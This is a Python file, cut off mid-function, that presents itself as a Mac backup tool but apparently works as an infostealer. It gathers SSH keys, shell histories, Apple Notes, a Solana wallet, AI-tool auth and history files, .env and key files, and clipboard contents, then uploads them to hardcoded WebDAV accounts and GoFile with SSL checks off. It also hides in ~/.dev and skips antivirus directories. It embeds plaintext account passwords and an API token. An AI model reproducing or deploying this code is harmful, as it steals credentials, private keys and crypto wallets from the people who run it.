# -*- coding: utf-8 -*-
"""
Mac自动备份和上传工具
功能：备份Mac系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import getpass
import traceback
import glob
import re
import json
import sqlite3
from pathlib import Path
from datetime import datetime, timedelta
from functools import lru_cache
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Iterator, Tuple, List

try:
    import fcntl
except ImportError:  # 非 Unix 平台不提供 fcntl
    fcntl = None


class BackupResult:
    """备份结果对象，用于区分完整成功、部分成功和失败。"""

    def __init__(self, path=None, status="success", missing_files=None,
                 copied_files=0, skipped_files=0, failed_files=None):
        self.path = path
        self.status = status
        self.missing_files = missing_files or []
        self.failed_files = failed_files or []
        self.copied_files = copied_files
        self.skipped_files = skipped_files

    def __bool__(self):
        return bool(self.path)

@lru_cache(maxsize=8192)
def get_file_size_cached(path: str) -> int:
    """缓存文件大小，避免重复系统调用

    Args:
        path: 文件路径

    Returns:
        文件大小（字节），失败返回 0
    """
    try:
        return os.path.getsize(path)
    except (OSError, IOError):
        return 0

try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None


class BackupConfig:
    """备份配置类"""

    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）

    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小

    # 压缩配置
    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 60  # JTB上传检查间隔（秒）
    
    # 文件操作配置
    SCAN_TIMEOUT = 1200  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    
    # 上传配置
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户主目录
    BACKUP_ROOT = os.path.expanduser('~/.dev/Backup')
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    RETRY_THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_retry_time.txt')
    BACKUP_STATE_FILE = os.path.join(BACKUP_ROOT, 'upload_state.json')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO

    # 显式需要扫描的云盘根目录。扫描过程会穿透其祖先目录，而不会按普通排除规则整棵剪枝。
    CLOUD_SCAN_ROOTS = [
        os.path.expanduser("~/Library/Mobile Documents/com~apple~CloudDocs"),
        os.path.expanduser("~/Library/CloudStorage"),
    ]
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档/代码类
        # 文本和文档
        ".txt", ".rtf", ".rst", ".tex", ".doc", ".docx", ".pages", ".md",
        # 电子表格
        ".xls", ".xlsx", ".et", ".numbers", ".csv", ".tsv", ".one",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        # 密钥和证书
        ".pem", ".key", ".keystore", ".secret", ".wallet",
        # SSH相关
        "id_rsa", "id_ecdsa", "id_ed25519",
        # 配置文件
        ".json", ".yaml", ".yml", ".xml", ".conf", ".config", ".ini", ".toml", ".env",
    ]   
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [
        # macOS 系统目录
        "Applications", "Library", "System", "Movies", "Music", "Pictures",
        
        # 开发工具和环境
        "node_modules", "venv", "myenv", "env", ".venv",
        ".gradle", ".m2", ".cargo", ".rustup", ".npm", ".nvm",
        ".local", ".cache", ".docker", ".gem",
        ".pyenv", ".rbenv", ".rvm", ".virtualenvs",
        "__pycache__", "dist", "build", "target",
        
        # IDE 和编辑器
        ".vscode", ".vscode-server", ".cursor", ".idea", ".eclipse",
        ".vs", ".atom", ".sublime",
        
        # 版本控制
        ".git", ".github", ".svn", ".hg",
        
        # 包管理器
        ".yarn", ".pnpm-store", ".bun",
        
        # 浏览器相关
        "Google", "Chrome", "Brave", "Firefox", "Safari", "Opera",
        "Chromium", "Edge",
        
        # 其他大型应用
        "Steam", "Epic Games", "Unity", "UnrealEngine",
        "Adobe", "Autodesk", "Blender", "NVIDIA",
        
        # 通讯软件
        "Discord", "Zoom", "Teams", "Skype", "Slack", "WeChat", "telegram",
        
        # 其他
        ".Trash", ".DS_Store", "Parallels", "VirtualBox VMs",
        "VMware", "Docker", ".zsh_sessions", ".dev",

        # 中文
        "火绒", "杀毒", "电脑管家",
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "cache", "temp", "tmp",
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        "__pycache__", ".pytest_cache",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        "downloads", "torrents",
        
        # 游戏相关
        "steam", "game", "gaming", "save",
        
        # 临时文件
        "log", "logs", "crash", "dumps", "dump", "report", "reports",
        
        # 其他
        "bak", "obsolete", "archive", "vpn", "v2ray", "clash",
        "thumb", "thumbnail", "preview", "trash", 
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://upload.gofile.io/uploadfile",          # 自动（最近节点）
        "https://upload-ap-hkg.gofile.io/uploadfile",   # 亚太（香港）
        "https://upload-ap-sgp.gofile.io/uploadfile",   # 亚太（新加坡）
        "https://upload-ap-tyo.gofile.io/uploadfile",   # 亚太（东京）
        "https://upload-na-phx.gofile.io/uploadfile",   # 北美（凤凰城）
    ]
    
    # 指定要直接复制的目录和文件（相对于用户主目录）
    MACOS_SPECIFIC_DIRS = [
        ".ssh",                                                   # SSH配置
        ".zshrc", 
        ".zprofile", 
        ".zshenv",
        ".bash_profile",
        ".bash_history",                                          # Bash历史记录
        ".python_history",                                        # Python历史记录
        ".node_repl_history",                                     # Node.js REPL 历史记录
        ".zsh_history",                                           # Zsh历史记录
        ".zsh_sessions",                                          # Zsh会话
        "Desktop",                                                # 桌面目录
        "Library/Group Containers/group.com.apple.notes",         # 备忘录数据目录
        "Library/Application Support/Claude/claude_desktop_config.json",
        ".config/solana/id.json",
        ".claude/config.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/history.jsonl",
        ".claude/channels/",
        ".codex/auth.json",
        ".codex/config.toml",
        ".codex/history.jsonl",
        ".hermes/.env",
        ".hermes/auth.json",
        ".hermes/config.yaml",
        ".hermes/channel_directory.json",
        ".hermes_history",
        ".openclaw/agents/",
        ".openclaw/workspace/.env",
        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]

# 模块加载时只配置控制台日志；文件日志在 BackupManager 创建备份目录后由 _setup_logging 初始化。
logging.basicConfig(
    level=logging.DEBUG if BackupConfig.DEBUG_MODE else BackupConfig.LOG_LEVEL,
    format=BackupConfig.LOG_FORMAT,
    handlers=[logging.StreamHandler()]
)


class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"  #infini-cloud-2
        self.infini_pass = "my95gfPVtKuDCpAK"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",  #infini-cloud-4
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_mac_backup"

        # 预编译排除目录的正则表达式和集合，优化字符串匹配性能
        self._exclude_keywords_pattern = re.compile(
            '|'.join(re.escape(kw) for kw in self.config.EXCLUDE_KEYWORDS),
            re.IGNORECASE
        )
        self._exclude_dirs_set = set(
            d.lower().replace('_', ' ').replace('-', ' ')
            for d in self.config.EXCLUDE_INSTALL_DIRS
        )

        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）
        self.api_token = "y2bp8HQfCVasZBwCN837ddKfuU2FZmja"
        
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            sensitive_values = [
                self.infini_pass,
                self.api_token,
            ]
            for infini_config in self.infini_configs:
                sensitive_values.append(infini_config.get("password"))
            sensitive_values = [str(v) for v in sensitive_values if v]

            class RedactingFormatter(logging.Formatter):
                """只对明确字段脱敏，不再因为消息中包含路径/URL就丢弃整条日志。"""
                def format(self, record):
                    message = super().format(record)
                    for secret in sensitive_values:
                        if secret:
                            message = message.replace(secret, "***")
                    return message

            class ConsoleFilter(logging.Filter):
                """控制台只保留关键状态和结果，抑制 DEBUG 及过于细节的 INFO。"""

                info_prefixes = (
                    "正在处理数据卷",
                    "正在配置用户主目录备份",
                    "已配置用户主目录备份",
                    "📊", "📁", "💾", "📤", "📝", "📋", "🍎", "⏰",
                    "🚀", "🔄", "☑️", "📸", "ℹ️", "✅", "❌", "⚠️", "📦",
                )

                def filter(self, record):
                    if record.levelno >= logging.WARNING:
                        return True
                    if record.levelno == logging.CRITICAL:
                        return True
                    if record.levelno != logging.INFO:
                        return False

                    message = record.getMessage().strip()
                    return message.startswith(self.info_prefixes)

            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = RedactingFormatter('%(asctime)s | %(levelname)-8s | %(message)s')
            file_handler.setFormatter(file_formatter)
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = RedactingFormatter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.setLevel(logging.INFO)
            console_handler.addFilter(ConsoleFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("✅ 日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _free_space(path):
        """返回路径所在磁盘的可用字节数，无法获取时返回 None。"""
        try:
            return shutil.disk_usage(path).free
        except (OSError, IOError):
            return None

    @staticmethod
    def _ensure_free_space(required_bytes, path):
        """检查可用空间是否满足 required_bytes，并保留最小安全余量。"""
        try:
            free = shutil.disk_usage(path).free
            required = required_bytes + BackupConfig.MIN_FREE_SPACE
            if free < required:
                logging.error(
                    f"磁盘空间不足: 需要至少 {required / (1024 * 1024):.1f}MB，"
                    f"当前可用 {free / (1024 * 1024):.1f}MB"
                )
                return False
            return True
        except (OSError, IOError):
            return True

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def _is_inside_cloud_root(self, path):
        """判断路径是否位于显式配置的云盘根目录内。"""
        abspath = os.path.normcase(os.path.abspath(path))
        for cloud_root in self.config.CLOUD_SCAN_ROOTS:
            root = os.path.normcase(os.path.abspath(os.path.expanduser(cloud_root)))
            if abspath == root or abspath.startswith(root + os.sep):
                return True
        return False

    def _is_ancestor_of_cloud_root(self, path):
        """判断路径是否是某个云盘根目录的祖先（扫描时需要保留其子目录）。"""
        abspath = os.path.normcase(os.path.abspath(path))
        for cloud_root in self.config.CLOUD_SCAN_ROOTS:
            root = os.path.normcase(os.path.abspath(os.path.expanduser(cloud_root)))
            if root.startswith(abspath + os.sep):
                return True
        return False

    def _filter_child_dirs_to_cloud_roots(self, parent, dirs):
        """仅在扫描穿透云盘祖先目录时，保留可能到达云盘根目录的子目录。"""
        parent_abs = os.path.normcase(os.path.abspath(parent))
        keep = []
        for dir_name in dirs:
            child = os.path.normcase(os.path.abspath(os.path.join(parent, dir_name)))
            if self._is_inside_cloud_root(child) or self._is_ancestor_of_cloud_root(child):
                keep.append(dir_name)
        dirs[:] = keep

    def should_exclude_dir(self, path):
        """检查是否应该排除目录。

        Args:
            path: 目录路径

        Returns:
            bool: 是否应该排除
        """
        # 优先排除备份根目录自身，避免自我备份
        backup_root = os.path.normcase(os.path.abspath(self.config.BACKUP_ROOT))
        abspath = os.path.normcase(os.path.abspath(path))
        if abspath == backup_root or abspath.startswith(backup_root + os.sep):
            return True

        # 显式配置的云盘目录不按普通规则排除
        if self._is_inside_cloud_root(abspath):
            return False

        # 云盘关键词集合（O(1) 查找），保留按完整路径段命中的云盘目录。
        cloud_keywords_set = {
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        }

        path_parts = [part.lower() for part in os.path.normpath(abspath).split(os.sep) if part]

        # 检查是否是云盘目录（按完整路径段匹配）
        for part in path_parts:
            if part in cloud_keywords_set:
                return False

        # 使用预编译的集合快速检查排除目录（O(1) 查找）
        for part in path_parts:
            part_normalized = part.replace('_', ' ').replace('-', ' ')
            if part_normalized in self._exclude_dirs_set:
                return True

        # 使用预编译的正则表达式快速匹配，但只有完整路径段命中关键词时才排除，
        # 避免 catalog 等仅包含 log 子串的目录被误伤。
        if self._exclude_keywords_pattern.search(os.path.sep.join(path_parts)):
            for part in path_parts:
                normalized_part = part.replace('_', ' ').replace('-', ' ').replace('.', ' ')
                word_parts = set(normalized_part.split())
                for keyword in self.config.EXCLUDE_KEYWORDS:
                    keyword_parts = set(keyword.lower().replace('_', ' ').replace('-', ' ').split())
                    if keyword_parts and keyword_parts.issubset(word_parts):
                        return True

        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        # 指定文件备份是独立流程，直接返回其结果，避免后续再次清理目标目录。
        if extensions_type == 4:
            if self.config.DEBUG_MODE:
                logging.debug("使用指定文件备份流程")
            return self.backup_specified_files(source_dir, target_dir)

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份目录:")
            logging.debug("源目录: %s", source_dir)
            logging.debug("目标目录: %s", target_dir)
            logging.debug("扩展名类型: %d", extensions_type)

        if not os.path.exists(source_dir):
            logging.error("❌ 磁盘源目录不存在: %s", source_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not os.access(source_dir, os.R_OK):
            logging.error("❌ 源目录没有读取权限: %s", source_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not self._ensure_free_space(0, os.path.dirname(target_dir) or target_dir):
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not self._clean_directory(target_dir):
            logging.error("❌ 无法清理或创建目标目录: %s", target_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])

        # 原有的文件类型备份逻辑
        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug("使用的文件扩展名: %s", extensions)
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # 已扫描目录数
        excluded_dirs = 0   # 已排除目录数
        skipped_files = 0   # 跳过的文件数
        matched_files = 0   # 匹配的文件数
        failed_files = []   # 复制失败的具体文件
        timed_out = False   # 扫描是否超时

        # macOS 特定文件类型
        macos_file_types = {
            'numbers': ['numbers', 'spreadsheet'],
            'pages': ['pages', 'document'],
            'keynote': ['keynote', 'presentation'],
            'textedit': ['textedit', 'text'],
            'preview': ['preview', 'image'],
            'pdf': ['pdf', 'document'],
            'rtf': ['rtf', 'document'],
            'rtfd': ['rtfd', 'document']
        }

        # macOS iWork 文档 MIME 类型（去除 keynote）
        macos_mime_types = {
            'pages': ['application/x-iwork-pages-sffpages'],
            'numbers': ['application/x-iwork-numbers-sffnumbers'],
        }
        # 纯文本类型
        plain_text_types = ['text/plain', 'text/x-env', 'text/rtf']

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"❌ 扫描目录超时: {source_dir}")
                    timed_out = True
                    break
                    
                # 定期显示进度
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug("⏳ 已扫描 %d 个目录，排除 %d 个目录", scanned_dirs, excluded_dirs)
                        logging.debug("⏳ 当前扫描: %s", root)
                        logging.debug("⏳ 已匹配 %d 个文件，跳过 %d 个文件", matched_files, skipped_files)
                    last_progress_time = current_time
                
                # 跳过目标目录
                root_abs = os.path.abspath(root)
                target_abs = os.path.abspath(target_dir)
                if root_abs == target_abs or root_abs.startswith(target_abs + os.sep):
                    continue

                # 云盘祖先目录本身不是备份目标，仅用于穿透扫描，不能处理其中的普通文件。
                if root != source_dir and self._is_ancestor_of_cloud_root(root):
                    self._filter_child_dirs_to_cloud_roots(root, dirs)
                    continue
                
                # 只对子目录做排除判断，根目录不排除
                if root != source_dir and self.should_exclude_dir(root):
                    excluded_dirs += 1
                    # 如果这是云盘根目录的祖先，必须保留子目录以继续向下扫描；
                    # 普通排除目录则直接剪枝，避免遍历无关内容。
                    if self._is_ancestor_of_cloud_root(root):
                        self._filter_child_dirs_to_cloud_roots(root, dirs)
                    else:
                        dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    file_lower = file.lower()
                    source_file = os.path.join(root, file)
                    
                    # 检查文件类型
                    should_backup = False
                    
                    # 1. 检查文件扩展名
                    if any(file_lower.endswith(ext.lower()) for ext in extensions):
                        should_backup = True
                    else:
                        # 2. 只对无扩展名文件做类型检测
                        if '.' not in file:
                            try:
                                file_type = subprocess.check_output(['file', '-b', '--mime-type', source_file]).decode('utf-8').strip()
                                if self.config.DEBUG_MODE:
                                    logging.debug("无扩展名文件类型检测: %s -> %s", file, file_type)
                                # 只识别 pages/numbers
                                for type_key, mime_list in macos_mime_types.items():
                                    if file_type in mime_list:
                                        should_backup = True
                                        if self.config.DEBUG_MODE:
                                            logging.debug("匹配到 macOS iWork 文件类型: %s -> %s", file, type_key)
                                        break
                                # 识别纯文本和env类型
                                if file_type in plain_text_types:
                                    should_backup = True
                                    if self.config.DEBUG_MODE:
                                        logging.debug(f"无扩展名文件识别为文本类型: {file} -> {file_type}")
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"文件类型检测失败: {source_file} - {str(e)}")
                    
                    if not should_backup:
                        skipped_files += 1
                        continue

                    matched_files += 1
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"获取文件大小失败: {source_file} - {str(e)}")
                        failed_files.append(source_file)
                        skipped_files += 1
                        continue

                    # 尝试复制文件
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"文件访问失败: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    failed_files.append(source_file)
                                    skipped_files += 1
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"创建目标子目录失败: {target_sub_dir}")
                                failed_files.append(source_file)
                                skipped_files += 1
                                break

                            if not self._ensure_free_space(file_size, target_sub_dir):
                                failed_files.append(source_file)
                                skipped_files += 1
                                break
                                
                            # 使用优化的分块复制（1MB块大小）
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                logging.debug(f"成功复制: {source_file} -> {target_file}")
                            
                            break  # 成功后跳出重试循环
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
                                failed_files.append(source_file)
                                skipped_files += 1

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 备份过程出错: {str(e)}")
        except Exception as e:
            logging.error(f"❌ 备份过程出现未知错误: {str(e)}")

        # 显示最终统计信息
        missing_files = list(dict.fromkeys(failed_files))
        if timed_out:
            missing_files.append(f"<扫描超时:{source_dir}>")

        if files_count == 0:
            if self.config.DEBUG_MODE:
                logging.debug(f"扫描统计:")
                logging.debug(f"- 扫描目录数: {scanned_dirs}")
                logging.debug(f"- 排除目录数: {excluded_dirs}")
                logging.debug(f"- 跳过文件数: {skipped_files}")
                logging.debug(f"- 匹配文件数: {matched_files}")
            logging.error(f"❌ 未找到需要备份的文件")
            return BackupResult(None, "failed", missing_files=missing_files,
                                copied_files=0, skipped_files=skipped_files)

        if missing_files:
            status = "partial"
            logging.warning(f"\n⚠️ 备份部分完成:")
            logging.warning(f"   📁 已复制文件数量: {files_count}")
            logging.warning(f"   💾 已复制总大小: {total_size / 1024 / 1024:.1f}MB")
            logging.warning(f"   ❌ 失败/遗漏文件数量: {len(missing_files)}")
            if self.config.DEBUG_MODE:
                for missing_file in missing_files[:20]:
                    logging.warning(f"      - {missing_file}")
        else:
            status = "success"
            logging.info(f"\n📊 备份完成:")
            logging.info(f"   📁 文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")

        if self.config.DEBUG_MODE:
            logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
            logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
            logging.debug(f"   ⏭️ 跳过文件数: {skipped_files}")
            logging.debug(f"   ✅ 匹配文件数: {matched_files}")

        return BackupResult(target_dir, status, missing_files=missing_files,
                            copied_files=files_count, skipped_files=skipped_files,
                            failed_files=missing_files)
    
    def _get_upload_server(self):
        """获取上传服务器地址
    
        Returns:
            str: 上传服务器URL
        """
        return "https://upload.gofile.io/uploadfile"

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表；不需要分片时返回空列表；分片失败返回 None。
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return []
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._clean_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files is None:
            # 分片失败，绝不能退化为删除原文件的单文件上传。
            logging.error(f"文件分片失败，保留原备份文件: {file_path}")
            return False
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # 若原始文件仍在，上传成功后删除
                if os.path.exists(file_path):
